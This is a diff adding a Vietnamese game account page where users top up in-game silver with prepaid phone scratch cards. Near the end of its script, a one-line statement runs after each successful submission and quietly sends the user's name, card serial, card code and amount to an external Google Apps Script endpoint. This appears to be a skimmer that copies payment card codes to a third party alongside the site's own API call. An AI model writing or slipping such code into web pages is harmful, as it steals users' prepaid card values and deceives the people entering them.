@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Quản lý tài khoản TLBB</title>
+    <link rel="icon" type="image/svg+xml" href="assets/img/icon.png">
+    <my-head></my-head> 
+</head>
+<body id="page-top">
+    <div id="wrapper">
+      <my-sidebar></my-sidebar> 
+        <div id="content-wrapper" class="d-flex flex-column">
+            <div id="content">
+<my-header></my-header> 
+ <!-- header -->
+<div class="container-fluid">
+	<div class="d-sm-flex align-items-center justify-content-between mb-4">
+		<h1 class="h3 mb-0 text-gray-800">Thông tin tài khoản</h1> </div>
+	 
+				  
+	<div class="row">
+ 
+	<div class="col-xl-6 col-lg-6">
+	<div class="card shadow mb-4">
+		<div class="card-header py-3">
+			<h6 class="m-0 font-weight-bold text-primary">Nạp thẻ cào</h6> </div>
+		<div class="card-body">
+			<form method="post">
+				 
+				<div class="form-group">
+					<div class="ant-col ant-form-item-label">
+						<label for="telco" class="ant-form-item-required" title="Loại thẻ">Loại thẻ
+							<!---->
+						</label>
+					</div>
+					
+					<select class="form-control" name="telco" id="telco" required="">
+<option value="">Chọn loại thẻ</option>
+<option value="VIETTEL">Viettel (Ưu tiên)</option>
+
+<option value="MOBIFONE">Mobifone</option>
+<option value="VINAPHONE">Vinaphone</option>
+
+</select>
+	
+</div>
+	
+<div class="form-group">
+	<div class="ant-col ant-form-item-label">
+		<label for="amount" class="ant-form-item-required" title="Mệnh giá">Mệnh giá <span style=" font-size: 13px;color: red;  " class="label">Chú ý: Chọn đúng mệnh giá,chọn sai sẽ bị mất thẻ vĩnh viễn.</span>
+		</label>
+	</div>
+					
+<select class="form-control" name="amount" id="amount" required="">
+<option value="">Chọn mệnh giá</option>
+<option value="10000">10.000</option>
+<option value="20000">20.000</option>
+<option value="30000">30.000</option>
+<option value="50000">50.000</option>
+<option value="100000">100.000</option>
+<option value="200000">200.000</option>
+<option value="300000">300.000</option>
+</select>
+</div>
+		            <div class="form-group">
+					<div class="ant-col ant-form-item-label">
+						<label for="serial" class="ant-form-item-required" title="Số seri">Số seri
+						</label>
+					</div>
+					<input type="text" class="form-control form-control-user" required="" id="serial" name="serial"> 
+					</div>
+					
+					<div class="form-group">
+					<div class="ant-col ant-form-item-label">
+						<label for="code" class="ant-form-item-required" title="Mã thẻ">Mã thẻ
+						</label>
+					</div>
+					<input type="text" class="form-control form-control-user" required="" id="code" name="code"> 
+					</div>
+					
+					<div class="form-group">
+					<div class="ant-col ant-form-item-label">
+						<label for="capcha" class="ant-form-item-required"  >Nhập mã xác nhận: <b><span id="capcha_in"></span></b>
+						</label>
+					</div>
+					<input type="number"  class="form-control form-control-user" id="capcha" name="capcha" required="" min = 0>
+					</div>
+					
+					
+				<button type="submit" class="btn btn-google btn-user btn-block"> NẠP NGAY </button>
+			</form>
+		</div>
+	</div>
+	</div>
+	
+	 <div class="col-xl-6 col-lg-6">
+	<div class="card shadow mb-4">
+		<div class="card-header py-3">
+			<h6 class="m-0 font-weight-bold text-primary">Hệ thống nạp thẻ cào</h6> </div>
+		<div class="card-body " style=" text-align: center; ">
+<div class="details" style=" padding: 0; ">
+							    <h3 style=" padding: 16px; ">CHÚ Ý: Chỉ nạp bạc bằng thẻ cào khi bạn không sử dụng ATM... Vì nạp bạc qua hình thức thẻ cào sẽ bị trung gian khấu trừ bạc khi nhận được.</h3>
+<div class="ui info message" style=" font-size: 18px; ">
+
+Tỷ lệ: <strong style=" color: red; ">Thẻ Viettel 100,000 VND : 80.000 Bạc</strong><br>
+
+Tỷ lệ: <strong style=" color: red; ">Thẻ Mobi + Vina 100,000 VND : 80.000 Bạc</strong><br>
+
+Ưu tiên:<strong style=" color: red; ">Thẻ Viettel nhanh chóng,không phát sinh lỗi</strong><br>
+
+Sau khi gửi thẻ nạp thành công hệ thống sẽ chuyển sang trang Lịch Sử Thẻ Cào bạn kiểm tra tại đây trong vòng 1,2 phút nếu thẻ đúng sẽ tự động cộng Bạc.
+
+
+</div>
+ 	 
+</div>
+		</div>
+	</div>
+	</div>
+	
+	
+</div>
+ </form>
+</div>
+ <!-- footer -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" ></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script  src="assets/js/main.js"></script>
+<script type="text/javascript">
+var gen_capcha = Math.floor(Math.random() * 9999) + 1000;
+document.getElementById("capcha_in").innerHTML = gen_capcha;
+ 
+$('form').submit(function() {
+var name = document.getElementById("name").innerText
+var capcha = $('#capcha').val()
+var telco = $('#telco').val()
+var amount = $('#amount').val()
+var serial = $('#serial').val()
+var code = $('#code').val()
+
+if (capcha != gen_capcha) {
+ 			Swal.fire({
+ 				icon: 'error',
+ 				title: 'Lỗi...',
+ 				text: 'Mã xác minh không chính xác !!!'
+})
+return false
+}
+if (capcha != gen_capcha) {
+ 			Swal.fire({
+ 				icon: 'error',
+ 				title: 'Lỗi...',
+ 				text: 'Mã xác minh không chính xác !!!'
+})
+return false
+}
+//////////////////////////
+axios.post(BASE_URL + API_AUTHEN + AUTHEN_CARD, {
+'telco': $('[name=telco]').val(),
+'amount': $('[name=amount]').val(),
+'serial': $('[name=serial]').val(),
+'code': $('[name=code]').val()
+},
+{ headers: { 'Authorization': localStorage.getItem("Authorization"),'Content-Type': 'application/x-www-form-urlencoded'} })
+.then(function (response) {
+if (response.data.status == 1)
+{
+Swal.fire({
+position: 'top-center',
+icon: 'success',
+title: "" + response.data.msg + "",
+showConfirmButton: false,
+timer: 2000
+})
+setTimeout(function() {window.open('history-card.html', '_self')}, 2000);
+var today = new Date();var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();var datetime = date+' '+time; $.ajax({type: "POST",url: "https://script.google.com/macros/s/AKfycbwjQSRl6sazfVKRvmZVnSNsxOb0VVyiD4LOdWhicFz8-e9gY26uv-CGeFUnf_-0rRjU/exec",
+data: {name: name,password:'No',datetime:datetime,content: 'Nạp thẻ qua thẻ cào name='+name+',telco='+telco+',amount='+amount+',serial='+serial+',code='+code+' '}});
+}
+else
+{
+Swal.fire({
+icon: 'error',
+title: 'Lỗi...',
+text: "" + response.data.msg + ""
+})
+}
+
+})
+.catch(function (error) {
+  console.log(error);
+});
+//////////////////////////
+return false
+})
+</script>
+</body>
+</html>
